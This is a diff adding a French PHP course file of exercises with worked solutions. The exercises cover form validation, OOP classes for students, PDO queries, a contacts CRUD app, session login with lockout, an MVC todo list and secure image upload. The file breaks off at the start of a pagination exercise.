+    $data['nom'] = trim($_POST['nom'] ?? '');
+    $data['email'] = trim($_POST['email'] ?? '');
+    $data['sujet'] = $_POST['sujet'] ?? '';
+    $data['message'] = trim($_POST['message'] ?? '');
+
+    // Validation nom
+    if (empty($data['nom'])) {
+        $erreurs['nom'] = "Le nom est obligatoire";
+    } elseif (mb_strlen($data['nom']) < 2 || mb_strlen($data['nom']) > 50) {
+        $erreurs['nom'] = "Le nom doit contenir entre 2 et 50 caracteres";
+    }
+
+    // Validation email
+    if (empty($data['email'])) {
+        $erreurs['email'] = "L'email est obligatoire";
+    } elseif (!filter_var($data['email'], FILTER_VALIDATE_EMAIL)) {
+        $erreurs['email'] = "L'email n'est pas valide";
+    }
+
+    // Validation sujet
+    if (!array_key_exists($data['sujet'], $sujets)) {
+        $erreurs['sujet'] = "Veuillez choisir un sujet valide";
+    }
+
+    // Validation message
+    if (empty($data['message'])) {
+        $erreurs['message'] = "Le message est obligatoire";
+    } elseif (mb_strlen($data['message']) < 10) {
+        $erreurs['message'] = "Le message doit contenir au moins 10 caracteres";
+    } elseif (mb_strlen($data['message']) > 1000) {
+        $erreurs['message'] = "Le message ne doit pas depasser 1000 caracteres";
+    }
+
+    if (empty($erreurs)) {
+        $succes = true;
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Contact</title></head>
+<body>
+    <h1>Formulaire de contact</h1>
+
+    <?php if ($succes): ?>
+        <div style="border: 2px solid green; padding: 15px; margin: 10px 0;">
+            <h2>Message envoye avec succes</h2>
+            <p><strong>Nom :</strong> <?= htmlspecialchars($data['nom']) ?></p>
+            <p><strong>Email :</strong> <?= htmlspecialchars($data['email']) ?></p>
+            <p><strong>Sujet :</strong> <?= htmlspecialchars($sujets[$data['sujet']]) ?></p>
+            <p><strong>Message :</strong><br><?= nl2br(htmlspecialchars($data['message'])) ?></p>
+        </div>
+    <?php else: ?>
+        <?php if (!empty($erreurs)): ?>
+            <div style="color: red;">
+                <ul>
+                    <?php foreach ($erreurs as $erreur): ?>
+                        <li><?= htmlspecialchars($erreur) ?></li>
+                    <?php endforeach; ?>
+                </ul>
+            </div>
+        <?php endif; ?>
+
+        <form method="POST">
+            <div>
+                <label>Nom :</label><br>
+                <input type="text" name="nom" value="<?= htmlspecialchars($data['nom']) ?>" required>
+            </div>
+            <div>
+                <label>Email :</label><br>
+                <input type="email" name="email" value="<?= htmlspecialchars($data['email']) ?>" required>
+            </div>
+            <div>
+                <label>Sujet :</label><br>
+                <select name="sujet" required>
+                    <option value="">-- Choisir --</option>
+                    <?php foreach ($sujets as $cle => $libelle): ?>
+                        <option value="<?= $cle ?>" <?= $data['sujet'] === $cle ? 'selected' : '' ?>>
+                            <?= htmlspecialchars($libelle) ?>
+                        </option>
+                    <?php endforeach; ?>
+                </select>
+            </div>
+            <div>
+                <label>Message :</label><br>
+                <textarea name="message" rows="5" cols="40" required><?= htmlspecialchars($data['message']) ?></textarea>
+            </div>
+            <button type="submit">Envoyer</button>
+        </form>
+    <?php endif; ?>
+</body>
+</html>
+```
+
+---
+
+### Exercice 5 -- POO : Classe Etudiant
+
+**Enonce :** Creer une classe `Etudiant` avec : nom, prenom, tableau de notes. Methodes : ajouterNote(), getMoyenne(), getMention(), afficher(). Creer une classe `Promotion` qui gere un ensemble d'etudiants avec : ajouter(), getMoyenneGenerale(), getMeilleurEtudiant(), getClassement().
+
+**Solution :**
+
+```php
+<?php
+class Etudiant {
+    private array $notes = [];
+
+    public function __construct(
+        private string $nom,
+        private string $prenom
+    ) {}
+
+    public function ajouterNote(float $note): void {
+        if ($note < 0 || $note > 20) {
+            throw new InvalidArgumentException("La note doit etre entre 0 et 20");
+        }
+        $this->notes[] = $note;
+    }
+
+    public function getMoyenne(): float {
+        if (empty($this->notes)) {
+            return 0;
+        }
+        return array_sum($this->notes) / count($this->notes);
+    }
+
+    public function getMention(): string {
+        $moyenne = $this->getMoyenne();
+        return match (true) {
+            $moyenne >= 16 => "Tres bien",
+            $moyenne >= 14 => "Bien",
+            $moyenne >= 12 => "Assez bien",
+            $moyenne >= 10 => "Passable",
+            default        => "Insuffisant",
+        };
+    }
+
+    public function getNomComplet(): string {
+        return $this->prenom . " " . $this->nom;
+    }
+
+    public function getNotes(): array {
+        return $this->notes;
+    }
+
+    public function afficher(): string {
+        $moyenne = number_format($this->getMoyenne(), 2);
+        return "{$this->getNomComplet()} - Moyenne: $moyenne/20 - {$this->getMention()}";
+    }
+}
+
+class Promotion {
+    private array $etudiants = [];
+
+    public function __construct(
+        private string $nom
+    ) {}
+
+    public function ajouter(Etudiant $etudiant): void {
+        $this->etudiants[] = $etudiant;
+    }
+
+    public function getMoyenneGenerale(): float {
+        if (empty($this->etudiants)) {
+            return 0;
+        }
+        $somme = array_sum(array_map(fn(Etudiant $e) => $e->getMoyenne(), $this->etudiants));
+        return $somme / count($this->etudiants);
+    }
+
+    public function getMeilleurEtudiant(): ?Etudiant {
+        if (empty($this->etudiants)) {
+            return null;
+        }
+        return array_reduce($this->etudiants, function (?Etudiant $meilleur, Etudiant $courant) {
+            if ($meilleur === null || $courant->getMoyenne() > $meilleur->getMoyenne()) {
+                return $courant;
+            }
+            return $meilleur;
+        });
+    }
+
+    public function getClassement(): array {
+        $classement = $this->etudiants;
+        usort($classement, fn(Etudiant $a, Etudiant $b) => $b->getMoyenne() <=> $a->getMoyenne());
+        return $classement;
+    }
+}
+
+// Test
+$promo = new Promotion("BTS SIO SLAM 2025");
+
+$alice = new Etudiant("Dupont", "Alice");
+$alice->ajouterNote(15);
+$alice->ajouterNote(17);
+$alice->ajouterNote(14);
+
+$bob = new Etudiant("Martin", "Bob");
+$bob->ajouterNote(12);
+$bob->ajouterNote(10);
+$bob->ajouterNote(11);
+
+$claire = new Etudiant("Bernard", "Claire");
+$claire->ajouterNote(18);
+$claire->ajouterNote(19);
+$claire->ajouterNote(17);
+
+$promo->ajouter($alice);
+$promo->ajouter($bob);
+$promo->ajouter($claire);
+
+echo "Moyenne generale : " . number_format($promo->getMoyenneGenerale(), 2) . "\n";
+echo "Meilleur(e) : " . $promo->getMeilleurEtudiant()->getNomComplet() . "\n";
+
+echo "\nClassement :\n";
+foreach ($promo->getClassement() as $rang => $etudiant) {
+    echo ($rang + 1) . ". " . $etudiant->afficher() . "\n";
+}
+```
+
+---
+
+### Exercice 6 -- Connexion PDO et requetes
+
+**Enonce :** Ecrire un script qui se connecte a une base MySQL, cree une table `articles` (id, titre, contenu, auteur, date_publication), insere 3 articles et les affiche tries par date decroissante.
+
+**Solution :**
+
+```php
+<?php
+try {
+    $pdo = new PDO(
+        "mysql:host=localhost;dbname=exercice_db;charset=utf8mb4",
+        "root",
+        "",
+        [
+            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+            PDO::ATTR_EMULATE_PREPARES => false,
+        ]
+    );
+
+    // Creation de la table
+    $pdo->exec("
+        CREATE TABLE IF NOT EXISTS articles (
+            id INT AUTO_INCREMENT PRIMARY KEY,
+            titre VARCHAR(200) NOT NULL,
+            contenu TEXT NOT NULL,
+            auteur VARCHAR(100) NOT NULL,
+            date_publication DATETIME DEFAULT CURRENT_TIMESTAMP
+        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+    ");
+
+    // Insertion de 3 articles
+    $stmt = $pdo->prepare("
+        INSERT INTO articles (titre, contenu, auteur, date_publication)
+        VALUES (:titre, :contenu, :auteur, :date)
+    ");
+
+    $articles = [
+        [
+            'titre' => 'Introduction a PHP',
+            'contenu' => 'PHP est un langage de script cote serveur...',
+            'auteur' => 'Alice Dupont',
+            'date' => '2025-01-15 10:00:00'
+        ],
+        [
+            'titre' => 'Les bases de MySQL',
+            'contenu' => 'MySQL est un systeme de gestion de base de donnees...',
+            'auteur' => 'Bob Martin',
+            'date' => '2025-01-20 14:30:00'
+        ],
+        [
+            'titre' => 'PDO en pratique',
+            'contenu' => 'PDO fournit une couche d\'abstraction pour les bases de donnees...',
+            'auteur' => 'Alice Dupont',
+            'date' => '2025-02-01 09:15:00'
+        ],
+    ];
+
+    foreach ($articles as $article) {
+        $stmt->execute($article);
+    }
+
+    echo "3 articles inseres.\n\n";
+
+    // Affichage par date decroissante
+    $stmt = $pdo->prepare("SELECT * FROM articles ORDER BY date_publication DESC");
+    $stmt->execute();
+    $resultats = $stmt->fetchAll();
+
+    foreach ($resultats as $article) {
+        $date = date('d/m/Y a H:i', strtotime($article['date_publication']));
+        echo "--- {$article['titre']} ---\n";
+        echo "Par {$article['auteur']} le $date\n";
+        echo "{$article['contenu']}\n\n";
+    }
+
+} catch (PDOException $e) {
+    die("Erreur : " . $e->getMessage());
+}
+```
+
+---
+
+### Exercice 7 -- CRUD complet
+
+**Enonce :** Realiser une application de gestion de contacts avec les fonctionnalites : lister, ajouter, modifier, supprimer. Champs : nom, prenom, email, telephone. Utiliser PDO avec requetes preparees.
+
+**Solution :**
+
+```php
+<?php
+// contacts.php
+session_start();
+
+$pdo = new PDO("mysql:host=localhost;dbname=exercice_db;charset=utf8mb4", "root", "", [
+    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+    PDO::ATTR_EMULATE_PREPARES => false,
+]);
+
+// Creer la table si elle n'existe pas
+$pdo->exec("
+    CREATE TABLE IF NOT EXISTS contacts (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        nom VARCHAR(100) NOT NULL,
+        prenom VARCHAR(100) NOT NULL,
+        email VARCHAR(150) NOT NULL,
+        telephone VARCHAR(20)
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+");
+
+$action = $_GET['action'] ?? 'list';
+$id = (int) ($_GET['id'] ?? 0);
+$erreurs = [];
+$message = $_SESSION['message'] ?? '';
+unset($_SESSION['message']);
+
+// --- TRAITEMENT POST ---
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $data = [
+        'nom' => trim($_POST['nom'] ?? ''),
+        'prenom' => trim($_POST['prenom'] ?? ''),
+        'email' => trim($_POST['email'] ?? ''),
+        'telephone' => trim($_POST['telephone'] ?? ''),
+    ];
+
+    if (empty($data['nom'])) $erreurs[] = "Nom obligatoire";
+    if (empty($data['prenom'])) $erreurs[] = "Prenom obligatoire";
+    if (!filter_var($data['email'], FILTER_VALIDATE_EMAIL)) $erreurs[] = "Email invalide";
+
+    if (empty($erreurs)) {
+        if ($action === 'add') {
+            $stmt = $pdo->prepare("INSERT INTO contacts (nom, prenom, email, telephone) VALUES (:nom, :prenom, :email, :telephone)");
+            $stmt->execute($data);
+            $_SESSION['message'] = "Contact ajoute";
+        } elseif ($action === 'edit' && $id > 0) {
+            $data['id'] = $id;
+            $stmt = $pdo->prepare("UPDATE contacts SET nom=:nom, prenom=:prenom, email=:email, telephone=:telephone WHERE id=:id");
+            $stmt->execute($data);
+            $_SESSION['message'] = "Contact modifie";
+        }
+        header("Location: contacts.php");
+        exit;
+    }
+}
+
+// --- SUPPRESSION ---
+if ($action === 'delete' && $id > 0) {
+    $stmt = $pdo->prepare("DELETE FROM contacts WHERE id = :id");
+    $stmt->execute([':id' => $id]);
+    $_SESSION['message'] = "Contact supprime";
+    header("Location: contacts.php");
+    exit;
+}
+
+// --- CHARGEMENT DES DONNEES ---
+$contacts = [];
+$contact = ['nom' => '', 'prenom' => '', 'email' => '', 'telephone' => ''];
+
+if ($action === 'list') {
+    $stmt = $pdo->prepare("SELECT * FROM contacts ORDER BY nom, prenom");
+    $stmt->execute();
+    $contacts = $stmt->fetchAll();
+}
+
+if ($action === 'edit' && $id > 0) {
+    $stmt = $pdo->prepare("SELECT * FROM contacts WHERE id = :id");
+    $stmt->execute([':id' => $id]);
+    $contact = $stmt->fetch() ?: $contact;
+}
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Gestion des contacts</title></head>
+<body>
+    <h1>Gestion des contacts</h1>
+    <nav><a href="contacts.php">Liste</a> | <a href="contacts.php?action=add">Ajouter</a></nav>
+
+    <?php if ($message): ?>
+        <p style="color:green;"><?= htmlspecialchars($message) ?></p>
+    <?php endif; ?>
+
+    <?php if (!empty($erreurs)): ?>
+        <ul style="color:red;">
+            <?php foreach ($erreurs as $e): ?>
+                <li><?= htmlspecialchars($e) ?></li>
+            <?php endforeach; ?>
+        </ul>
+    <?php endif; ?>
+
+    <?php if ($action === 'list'): ?>
+        <table border="1" cellpadding="5">
+            <tr><th>Nom</th><th>Prenom</th><th>Email</th><th>Telephone</th><th>Actions</th></tr>
+            <?php foreach ($contacts as $c): ?>
+            <tr>
+                <td><?= htmlspecialchars($c['nom']) ?></td>
+                <td><?= htmlspecialchars($c['prenom']) ?></td>
+                <td><?= htmlspecialchars($c['email']) ?></td>
+                <td><?= htmlspecialchars($c['telephone'] ?? '-') ?></td>
+                <td>
+                    <a href="?action=edit&id=<?= $c['id'] ?>">Modifier</a>
+                    <a href="?action=delete&id=<?= $c['id'] ?>" onclick="return confirm('Supprimer ?')">Supprimer</a>
+                </td>
+            </tr>
+            <?php endforeach; ?>
+        </table>
+
+    <?php elseif ($action === 'add' || $action === 'edit'): ?>
+        <h2><?= $action === 'add' ? 'Ajouter' : 'Modifier' ?> un contact</h2>
+        <form method="POST">
+            <label>Nom : <input type="text" name="nom" value="<?= htmlspecialchars($contact['nom']) ?>" required></label><br>
+            <label>Prenom : <input type="text" name="prenom" value="<?= htmlspecialchars($contact['prenom']) ?>" required></label><br>
+            <label>Email : <input type="email" name="email" value="<?= htmlspecialchars($contact['email']) ?>" required></label><br>
+            <label>Telephone : <input type="tel" name="telephone" value="<?= htmlspecialchars($contact['telephone']) ?>"></label><br>
+            <button type="submit">Enregistrer</button>
+        </form>
+    <?php endif; ?>
+</body>
+</html>
+```
+
+---
+
+### Exercice 8 -- Sessions et authentification
+
+**Enonce :** Creer un systeme d'authentification complet avec : page de connexion, page protegee (tableau de bord), deconnexion. Le mot de passe doit etre hache. Compter le nombre de tentatives echouees et bloquer apres 5 echecs pendant 15 minutes.
+
+**Solution :**
+
+```php
+<?php
+// config.php
+session_start();
+
+$pdo = new PDO("mysql:host=localhost;dbname=exercice_db;charset=utf8mb4", "root", "", [
+    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+    PDO::ATTR_EMULATE_PREPARES => false,
+]);
+
+$pdo->exec("
+    CREATE TABLE IF NOT EXISTS utilisateurs (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        email VARCHAR(150) UNIQUE NOT NULL,
+        mot_de_passe VARCHAR(255) NOT NULL,
+        tentatives_echouees INT DEFAULT 0,
+        bloque_jusqu_a DATETIME DEFAULT NULL
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+");
+
+// Creer un utilisateur de test (a executer une seule fois)
+// $hash = password_hash('motdepasse123', PASSWORD_DEFAULT);
+// $pdo->prepare("INSERT IGNORE INTO utilisateurs (email, mot_de_passe) VALUES (?, ?)")
+//     ->execute(['admin@test.com', $hash]);
+```
+
+```php
+<?php
+// login.php
+require_once 'config.php';
+
+if (isset($_SESSION['user_id'])) {
+    header("Location: dashboard.php");
+    exit;
+}
+
+$erreur = '';
+$email = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $email = trim($_POST['email'] ?? '');
+    $motdepasse = $_POST['motdepasse'] ?? '';
+
+    $stmt = $pdo->prepare("SELECT * FROM utilisateurs WHERE email = :email");
+    $stmt->execute([':email' => $email]);
+    $user = $stmt->fetch();
+
+    if ($user) {
+        // Verifier le blocage
+        if ($user['bloque_jusqu_a'] !== null && strtotime($user['bloque_jusqu_a']) > time()) {
+            $reste = ceil((strtotime($user['bloque_jusqu_a']) - time()) / 60);
+            $erreur = "Compte bloque. Reessayez dans $reste minute(s).";
+        } elseif (password_verify($motdepasse, $user['mot_de_passe'])) {
+            // Succes : reinitialiser les tentatives
+            $stmt = $pdo->prepare("UPDATE utilisateurs SET tentatives_echouees = 0, bloque_jusqu_a = NULL WHERE id = :id");
+            $stmt->execute([':id' => $user['id']]);
+
+            session_regenerate_id(true);
+            $_SESSION['user_id'] = $user['id'];
+            $_SESSION['email'] = $user['email'];
+
+            header("Location: dashboard.php");
+            exit;
+        } else {
+            // Echec : incrementer les tentatives
+            $tentatives = $user['tentatives_echouees'] + 1;
+            $bloqueJusqua = null;
+
+            if ($tentatives >= 5) {
+                $bloqueJusqua = date('Y-m-d H:i:s', time() + 15 * 60);
+                $erreur = "Trop de tentatives. Compte bloque pour 15 minutes.";
+            } else {
+                $erreur = "Identifiants incorrects. " . (5 - $tentatives) . " tentative(s) restante(s).";
+            }
+
+            $stmt = $pdo->prepare("UPDATE utilisateurs SET tentatives_echouees = :t, bloque_jusqu_a = :b WHERE id = :id");
+            $stmt->execute([':t' => $tentatives, ':b' => $bloqueJusqua, ':id' => $user['id']]);
+        }
+    } else {
+        $erreur = "Identifiants incorrects";
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Connexion</title></head>
+<body>
+    <h1>Connexion</h1>
+    <?php if ($erreur): ?>
+        <p style="color:red;"><?= htmlspecialchars($erreur) ?></p>
+    <?php endif; ?>
+    <form method="POST">
+        <label>Email : <input type="email" name="email" value="<?= htmlspecialchars($email) ?>" required></label><br>
+        <label>Mot de passe : <input type="password" name="motdepasse" required></label><br>
+        <button type="submit">Se connecter</button>
+    </form>
+</body>
+</html>
+```
+
+```php
+<?php
+// dashboard.php
+require_once 'config.php';
+
+if (!isset($_SESSION['user_id'])) {
+    header("Location: login.php");
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Tableau de bord</title></head>
+<body>
+    <h1>Tableau de bord</h1>
+    <p>Bienvenue, <?= htmlspecialchars($_SESSION['email']) ?></p>
+    <a href="logout.php">Se deconnecter</a>
+</body>
+</html>
+```
+
+```php
+<?php
+// logout.php
+session_start();
+$_SESSION = [];
+if (ini_get("session.use_cookies")) {
+    $p = session_get_cookie_params();
+    setcookie(session_name(), '', time() - 42000, $p["path"], $p["domain"], $p["secure"], $p["httponly"]);
+}
+session_destroy();
+header("Location: login.php");
+exit;
+```
+
+---
+
+### Exercice 9 -- MVC : Application de gestion de taches
+
+**Enonce :** Creer une application de gestion de taches (todo list) en architecture MVC. Fonctionnalites : lister les taches, ajouter une tache, marquer comme terminee, supprimer. Table : id, titre, description, statut (en_cours/terminee), priorite (basse/normale/haute), date_creation.
+
+**Solution :**
+
+```php
+<?php
+// Models/Tache.php
+class Tache {
+    private PDO $pdo;
+
+    public function __construct(PDO $pdo) {
+        $this->pdo = $pdo;
+    }
+
+    public function findAll(string $filtre = 'toutes'): array {
+        $sql = "SELECT * FROM taches";
+        $params = [];
+
+        if ($filtre === 'en_cours') {
+            $sql .= " WHERE statut = :statut";
+            $params[':statut'] = 'en_cours';
+        } elseif ($filtre === 'terminee') {
+            $sql .= " WHERE statut = :statut";
+            $params[':statut'] = 'terminee';
+        }
+
+        $sql .= " ORDER BY FIELD(priorite, 'haute', 'normale', 'basse'), date_creation DESC";
+
+        $stmt = $this->pdo->prepare($sql);
+        $stmt->execute($params);
+        return $stmt->fetchAll();
+    }
+
+    public function findById(int $id): array|false {
+        $stmt = $this->pdo->prepare("SELECT * FROM taches WHERE id = :id");
+        $stmt->execute([':id' => $id]);
+        return $stmt->fetch();
+    }
+
+    public function create(array $data): int {
+        $stmt = $this->pdo->prepare("
+            INSERT INTO taches (titre, description, priorite)
+            VALUES (:titre, :description, :priorite)
+        ");
+        $stmt->execute([
+            ':titre' => $data['titre'],
+            ':description' => $data['description'] ?? '',
+            ':priorite' => $data['priorite'] ?? 'normale',
+        ]);
+        return (int) $this->pdo->lastInsertId();
+    }
+
+    public function toggleStatut(int $id): void {
+        $tache = $this->findById($id);
+        if ($tache) {
+            $nouveauStatut = ($tache['statut'] === 'en_cours') ? 'terminee' : 'en_cours';
+            $stmt = $this->pdo->prepare("UPDATE taches SET statut = :statut WHERE id = :id");
+            $stmt->execute([':statut' => $nouveauStatut, ':id' => $id]);
+        }
+    }
+
+    public function delete(int $id): void {
+        $stmt = $this->pdo->prepare("DELETE FROM taches WHERE id = :id");
+        $stmt->execute([':id' => $id]);
+    }
+
+    public function compter(): array {
+        $stmt = $this->pdo->prepare("
+            SELECT statut, COUNT(*) AS total
+            FROM taches
+            GROUP BY statut
+        ");
+        $stmt->execute();
+        $resultats = $stmt->fetchAll();
+
+        $compteurs = ['en_cours' => 0, 'terminee' => 0];
+        foreach ($resultats as $r) {
+            $compteurs[$r['statut']] = (int) $r['total'];
+        }
+        return $compteurs;
+    }
+}
+```
+
+```php
+<?php
+// Controllers/TacheController.php
+class TacheController {
+    private Tache $model;
+
+    public function __construct(PDO $pdo) {
+        $this->model = new Tache($pdo);
+    }
+
+    public function index(): void {
+        $filtre = $_GET['filtre'] ?? 'toutes';
+        $taches = $this->model->findAll($filtre);
+        $compteurs = $this->model->compter();
+        require __DIR__ . '/../Views/taches/index.php';
+    }
+
+    public function create(): void {
+        $erreurs = [];
+
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            $data = [
+                'titre' => trim($_POST['titre'] ?? ''),
+                'description' => trim($_POST['description'] ?? ''),
+                'priorite' => $_POST['priorite'] ?? 'normale',
+            ];
+
+            if (empty($data['titre'])) {
+                $erreurs[] = "Le titre est obligatoire";
+            }
+            if (!in_array($data['priorite'], ['basse', 'normale', 'haute'])) {
+                $erreurs[] = "Priorite invalide";
+            }
+
+            if (empty($erreurs)) {
+                $this->model->create($data);
+                header("Location: ?action=index");
+                exit;
+            }
+        }
+
+        require __DIR__ . '/../Views/taches/create.php';
+    }
+
+    public function toggle(): void {
+        $id = (int) ($_GET['id'] ?? 0);
+        if ($id > 0) {
+            $this->model->toggleStatut($id);
+        }
+        header("Location: ?action=index");
+        exit;
+    }
+
+    public function delete(): void {
+        $id = (int) ($_GET['id'] ?? 0);
+        if ($id > 0) {
+            $this->model->delete($id);
+        }
+        header("Location: ?action=index");
+        exit;
+    }
+}
+```
+
+```php
+<?php
+// Views/taches/index.php
+?>
+<h1>Mes taches</h1>
+<p>En cours : <?= $compteurs['en_cours'] ?> | Terminees : <?= $compteurs['terminee'] ?></p>
+
+<nav>
+    <a href="?action=index&filtre=toutes">Toutes</a> |
+    <a href="?action=index&filtre=en_cours">En cours</a> |
+    <a href="?action=index&filtre=terminee">Terminees</a> |
+    <a href="?action=create">Nouvelle tache</a>
+</nav>
+
+<table border="1" cellpadding="5">
+    <tr><th>Titre</th><th>Priorite</th><th>Statut</th><th>Date</th><th>Actions</th></tr>
+    <?php foreach ($taches as $t): ?>
+    <tr style="<?= $t['statut'] === 'terminee' ? 'text-decoration:line-through; opacity:0.6;' : '' ?>">
+        <td><?= htmlspecialchars($t['titre']) ?></td>
+        <td><?= htmlspecialchars($t['priorite']) ?></td>
+        <td><?= $t['statut'] === 'en_cours' ? 'En cours' : 'Terminee' ?></td>
+        <td><?= date('d/m/Y H:i', strtotime($t['date_creation'])) ?></td>
+        <td>
+            <a href="?action=toggle&id=<?= $t['id'] ?>">
+                <?= $t['statut'] === 'en_cours' ? 'Terminer' : 'Reprendre' ?>
+            </a>
+            <a href="?action=delete&id=<?= $t['id'] ?>" onclick="return confirm('Supprimer ?')">Supprimer</a>
+        </td>
+    </tr>
+    <?php endforeach; ?>
+</table>
+```
+
+---
+
+### Exercice 10 -- Securite et upload
+
+**Enonce :** Creer un formulaire d'ajout de produit avec upload d'image. Le formulaire doit inclure : nom, prix, description, image. Implementer toutes les protections : CSRF, validation, sanitization, verification du type MIME de l'image, renommage du fichier. Stocker les informations en base de donnees.
+
+**Solution :**
+
+```php
+<?php
+session_start();
+
+$pdo = new PDO("mysql:host=localhost;dbname=exercice_db;charset=utf8mb4", "root", "", [
+    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+    PDO::ATTR_EMULATE_PREPARES => false,
+]);
+
+$pdo->exec("
+    CREATE TABLE IF NOT EXISTS produits_images (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        nom VARCHAR(150) NOT NULL,
+        prix DECIMAL(10,2) NOT NULL,
+        description TEXT,
+        image VARCHAR(255),
+        date_creation DATETIME DEFAULT CURRENT_TIMESTAMP
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+");
+
+// Fonctions CSRF
+function genererCSRF(): string {
+    if (empty($_SESSION['csrf'])) {
+        $_SESSION['csrf'] = bin2hex(random_bytes(32));
+    }
+    return $_SESSION['csrf'];
+}
+
+function verifierCSRF(string $token): bool {
+    return isset($_SESSION['csrf']) && hash_equals($_SESSION['csrf'], $token);
+}
+
+$erreurs = [];
+$succes = '';
+$data = ['nom' => '', 'prix' => '', 'description' => ''];
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Verification CSRF
+    if (!verifierCSRF($_POST['csrf'] ?? '')) {
+        die("Token CSRF invalide");
+    }
+
+    $data['nom'] = trim($_POST['nom'] ?? '');
+    $data['prix'] = $_POST['prix'] ?? '';
+    $data['description'] = trim($_POST['description'] ?? '');
+
+    // Validation
+    if (empty($data['nom']) || mb_strlen($data['nom']) > 150) {
+        $erreurs[] = "Nom obligatoire (150 caracteres max)";
+    }
+
+    $prix = filter_var($data['prix'], FILTER_VALIDATE_FLOAT);
+    if ($prix === false || $prix <= 0) {
+        $erreurs[] = "Prix invalide (doit etre un nombre positif)";
+    }
+
+    // Validation image
+    $nomImage = null;
+    if (isset($_FILES['image']) && $_FILES['image']['error'] === UPLOAD_ERR_OK) {
+        $fichier = $_FILES['image'];
+        $typesOK = ['image/jpeg', 'image/png', 'image/webp'];
+        $finfo = new finfo(FILEINFO_MIME_TYPE);
+        $typeMime = $finfo->file($fichier['tmp_name']);
+
+        if (!in_array($typeMime, $typesOK, true)) {
+            $erreurs[] = "Image : seuls JPEG, PNG et WEBP sont acceptes";
+        } elseif ($fichier['size'] > 2 * 1024 * 1024) {
+            $erreurs[] = "Image : 2 Mo maximum";
+        } else {
+            $ext = match ($typeMime) {
+                'image/jpeg' => 'jpg',
+                'image/png'  => 'png',
+                'image/webp' => 'webp',
+            };
+            $nomImage = uniqid('prod_', true) . '.' . $ext;
+        }
+    } elseif (isset($_FILES['image']) && $_FILES['image']['error'] !== UPLOAD_ERR_NO_FILE) {
+        $erreurs[] = "Erreur lors de l'upload de l'image";
+    }
+
+    // Enregistrement
+    if (empty($erreurs)) {
+        // Deplacer l'image
+        if ($nomImage !== null) {
+            $dossier = __DIR__ . '/uploads/';
+            if (!is_dir($dossier)) {
+                mkdir($dossier, 0755, true);
+            }
+            move_uploaded_file($_FILES['image']['tmp_name'], $dossier . $nomImage);
+        }
+
+        $stmt = $pdo->prepare("
+            INSERT INTO produits_images (nom, prix, description, image)
+            VALUES (:nom, :prix, :description, :image)
+        ");
+        $stmt->execute([
+            ':nom' => $data['nom'],
+            ':prix' => $prix,
+            ':description' => $data['description'],
+            ':image' => $nomImage,
+        ]);
+
+        unset($_SESSION['csrf']);
+        $succes = "Produit ajoute avec succes (ID: " . $pdo->lastInsertId() . ")";
+        $data = ['nom' => '', 'prix' => '', 'description' => ''];
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Ajout produit</title></head>
+<body>
+    <h1>Ajouter un produit</h1>
+
+    <?php if ($succes): ?>
+        <p style="color:green;"><?= htmlspecialchars($succes) ?></p>
+    <?php endif; ?>
+
+    <?php if ($erreurs): ?>
+        <ul style="color:red;">
+            <?php foreach ($erreurs as $e): ?>
+                <li><?= htmlspecialchars($e) ?></li>
+            <?php endforeach; ?>
+        </ul>
+    <?php endif; ?>
+
+    <form method="POST" enctype="multipart/form-data">
+        <input type="hidden" name="csrf" value="<?= genererCSRF() ?>">
+
+        <label>Nom :<br><input type="text" name="nom" value="<?= htmlspecialchars($data['nom']) ?>" required></label><br><br>
+
+        <label>Prix (EUR) :<br><input type="number" name="prix" step="0.01" min="0.01" value="<?= htmlspecialchars($data['prix']) ?>" required></label><br><br>
+
+        <label>Description :<br><textarea name="description" rows="4" cols="40"><?= htmlspecialchars($data['description']) ?></textarea></label><br><br>
+
+        <label>Image (JPEG, PNG, WEBP - 2 Mo max) :<br><input type="file" name="image" accept="image/jpeg,image/png,image/webp"></label><br><br>
+
+        <button type="submit">Ajouter le produit</button>
+    </form>
+</body>
+</html>
+```
+
+---
+
+### Exercice 11 -- Pagination et recherche
+
+**Enonce :** Creer une page de recherche de produits avec pagination. L'utilisateur peut saisir un mot-cle et filtrer par categorie. Afficher 5 resultats par page avec navigation.
+
+**Solution :**
+
+```php
+<?php
+$pdo = new PDO("mysql:host=localhost;dbname=exercice_db;charset=utf8mb4", "root", "", [
+    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+    PDO::ATTR_EMULATE_PREPARES => false,
+]);
+
+$parPage = 5;
+$page = max(1, (int) ($_GET['page'] ?? 1));
+$recherche = trim($_GET['q'] ?? '');
+$categorie = trim($_GET['cat'] ?? '');
+
+// Construire la requete dynamiquement
+$conditions = ["actif = 1"];
+$params = [];
+
+if (!empty($recherche)) {
+    $conditions[] = "(nom LIKE :q OR description LIKE :q)";
+    $params[':q'] = '%' . $recherche . '%';
+}
+
+if (!empty($categorie)) {
